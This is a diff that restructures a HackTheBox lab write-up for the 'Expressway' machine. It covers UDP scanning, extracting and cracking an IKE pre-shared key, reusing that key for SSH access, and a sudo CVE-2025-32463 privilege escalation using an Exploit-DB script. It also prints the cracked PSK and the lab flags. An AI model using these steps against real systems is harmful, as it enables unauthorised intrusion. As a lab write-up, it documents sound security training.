@@ -1,28 +1,42 @@
 # Expressway (Linux)
 
-My solution pertaining to the machine **Expressway** on HTB Labs.
+---
+
+## Overview
+
+This report documents my exploitation of the **Expressway** machine on HackTheBox.
+The attack path involved:
+
+- Discovering an exposed ISAKMP (IKE) service over UDP
+- Extracting and cracking an IKE PSK hash
+- Using the recovered PSK to authenticate over SSH
+- Performing local privilege escalation by exploiting a vulnerable sudo version
+- Gaining root access and retrieving both user and root flags
+
+The compromise reflects weaknesses in VPN configuration, cryptographic key management, and outdated system components.
 
 ---
 
-## Recon
+## Reconnaissance
 
-I start by scanning all ports with a basic NMAP scan:
+I began with a full TCP port scan:
 
 ```
 sudo nmap 10.129.8.198 -p-
 ```
 
-Only port **22** appears to be open.
+Only port **22** (SSH) was open.
 
 ![Filtered output](images/nmap1.PNG)
 
-I continue by adding service detection (**-sV**) and default scripts (**-sC**) to the NMAP command: 
+I followed up with a service and default script scan: 
 
 ```
 sudo nmap 10.129.8.198 -p 22 -sV -sC
 ```
 
-Port 22 is running **OpenSSH version 10.0p2** on a **Linux** OS. 
+The host was running **OpenSSH 10.0p2** on Linux.
+
 
 ![Filtered output](images/nmap2.PNG)
 
@@ -32,62 +46,64 @@ I run some targeted SSH scripts with NSE:
 sudo nmap 10.129.8.198 -p 22 --script ssh*
 ```
 
-The SSH scripts did not reveal anything of importance. Since i don't have a valid username or password/SSH key, i don't think this is the intended attack vector. I could attempt brute-forcing with a tool such as **Hydra**, but brute-forcing is rarely the purpuse of HTB labs.
+NSE SSH scripts returned no useful misconfigurations or weaknesses. 
 
-Most services run over TCP, but **UDP** services are still widely deployed and often exploitable. I run a new NMAP scan using UDP and include some **optimization flags** since UDP scans are much slower than TCP scans:
+Because the TCP footprint was minimal, I proceeded with a full UDP scan:
 
 ```
 sudo nmap -p- -sU 10.129.8.198 --max-retries 0 --min-rate=3000
 ```
 
-I discover an interesting service running on port **500**.
+This identified UDP port **500** open, running **ISAKMP**, a key exchange protocol used in IPsec VPN deployments. This service aligned with the machine name "Expressway", suggesting a VPN or tunneling theme.
 
 ![Filtered output](images/nmap4.PNG)
 
-After doing some research i discover that **ISAKMP** is a protocol used for IPsec-tunnels, which coincides nicely with the machine name "Expressway", hinting at a tunnel or gateway. My research also leads me to a tool called **ike-scan** used for discovering and enumerating hosts running IPsec VPN servers. 
+---
 
-I start by installing the tool:
+## Service Enumeration
+
+To enumerate the VPN gateway, I used **ike-scan**, a tool designed for fingerprinting IKE configurations.
 
 ```
 sudo apt install ike-scan
-```
-
-I run an **ike-scan** in aggressive mode:
-
-```
 sudo ike-scan -A 10.129.8.198
 ```
 
 ![Filtered output](images/ike-scan1.PNG)
 
-The scan reveals some interesting information:
+The scan revealed some interesting information:
 
-- VPN login: ike@expressway.htb
-- PSK hash: 20 bytes
-- Encryption: 3DES/SHA1
-- DH group: modp1024
+| Type              | Value                 |
+| ----------------- | --------------------- |
+| `IKE ID`          | `ike@expressway.htb`  |
+| `PSK`             | `20-byte SHA1`        |
+| `Encryption`      | `3DES/SHA1`           |
+| `DH Group`        | `modp1024`            |
 
-By including the **--pskcrack** flag the raw PSK can be written to file and used for offline cracking with the **psk-crack** tool:
+
+To extract the raw PSK hash for offline cracking:
 
 ```
 sudo ike-scan -A --pskcrack=ike_hash.txt 10.129.8.198
 ```
 
-The next step is to attempt to crack the hash with the **psk-crack** tool. I will utilize a wordlist called **rockyou.txt**. The wordlist is available in **Gzip** format on all HTB machines. You need to decompress the file before use:
+First, I ensured the RockYou wordlist was decompressed:
 
 ```
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 ```
 
+I then attempted cracking using **psk-crack**:
+
 ```
 psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
 ```
 
+The PSK was succesfully recovered! 
+
 ![Filtered output](images/ikescan2.PNG)
 
-The hash was succesfully cracked! 
-
-You don't have to use **psk-crack**, you can just as well use **hashcat** or **JohnTheRipper**. To crack the hash with **hashcat** use mode 5400 (IKE-PSK SHA1).
+As an alternative, **Hashcat** also supports this hash type (mode 5400):
 
 ```
 hashcat -a 0 -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
@@ -95,15 +111,19 @@ hashcat -a 0 -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
 
 ![Filtered output](images/ike-scan2.PNG)
 
-Below is a short summary of obtained information about the target:
+Recovered Credentials:
 
-- IP: 10.129.8.198
-- ID: ike@expressway.htb
-- PSK: freakingrockstarontheroad
+| Type              | Value                        |
+| ----------------- | ---------------------------- |
+| `IKE ID`          | `ike@expressway.htb`         |
+| `PSK`             | `freakingrockstarontheroad`  |
 
-The next step is figuring out how to utilize the information obtained in order to connect to the target. 
 
-Let's start of with a simple SSH connection to **ike@expressway.htb**:
+---
+
+## Initial Access
+
+With the recovered PSK and IKE identity, I attempted SSH access:
 
 ```
 ssh ike@expressway.htb
@@ -111,27 +131,29 @@ ssh ike@expressway.htb
 
 ![Filtered output](images/ssh-1.PNG)
 
-It did not work because we have not added the hostname to the **/etc/hosts** file. Add the hostname and try again:
+The connection initially failed due to missing host resolution. I added the hostname to **/etc/hosts**:
 
 ```
-echo "10.129.12.184 ike@expressway.htb" >> /etc/hosts
+echo "10.129.8.198 expressway.htb" | sudo tee -a /etc/hosts
 ```
+
+Retrying the SSH connection:
 
 ```
 ssh ike@expressway.htb
 ```
 
-We have gained access to the system!
+I successfully authenticated and obtained a user shell.
 
 ![Filtered output](images/ssh-2.PNG)
 
-The first flag is located in the users home directory in a file called **user.txt**:
+The first flag was located in the home directory in a file called **user.txt**:
 
 ```
-cat user.txt
+cat ~/user.txt
 ```
 
-Flag:
+User Flag:
 
 ```
 6e42b743d77c11b2093c7b7d9d50be82
@@ -139,44 +161,50 @@ Flag:
 
 ![Filtered output](images/userflag.PNG)
 
-Since the user flag was conveniently called **user.txt** i suspect the root flag might be called **root.txt**. I use the find command to search the system for any that matches that name:
+---
+
+## Privilege Escalation
+
+I attempted to search for the root flag:
 
 ```
 sudo find / -type f -name "root.txt"
 ```
 
-For some reason the user **ike** is not allowed to run sudo commands.
+However, the user had no sudo privileges.
 
 ![Filtered output](images/sudo.PNG)
 
-Let's check the version of sudo:
+Checking the sudo version:
 
 ```
 sudo --version
 ```
 
-It appears the we are running version **1.9.17**.
+The system ran sudo **1.9.17**, which is vulnerable to CVE-2025-32463, a local privilege escalation flaw. I obtained a public exploit script from **Exploit-DB (ID 52352)** and saved it as **exploit.sh**.
 
 ![Filtered output](images/sudo2.PNG)
 
-Perhaps there is some known exploit that would allow us to escalate our privileges. A quick google search for **sudo 1.9.17 exploit** presents us with several potential attack vectors. One of particular interest is CVE-2025-32463, which is a local privelege escalation vulnerability. I found an exploit in the form of a bash script, that i simply copied and pasted into a file called **exploit.sh**. The exploit can be found here:
-
-- https://www.exploit-db.com/exploits/52352
-
- When i executed the exploit i gained root privileges:
+After making it executable:
 
 ```
 chmod +x exploit.sh
 ./exploit.sh
 ```
 
+This successfully elevated the session to root.
+
 ![Filtered output](images/sudo3.PNG)
 
-Search for the **root.txt** file again:
+---
+
+## Post Exploitation
+
+With root access, I searched again for the root flag:
 
 ```
 find / -type f -name "root.txt"
-cat root/root.txt
+cat /root/root.txt
 ```
 
 Root flag:
@@ -186,5 +214,3 @@ Root flag:
 ```
 
 ![Filtered output](images/rootflag.PNG)
-
-There we have it, the root flag has been captured and the machine PWNED!
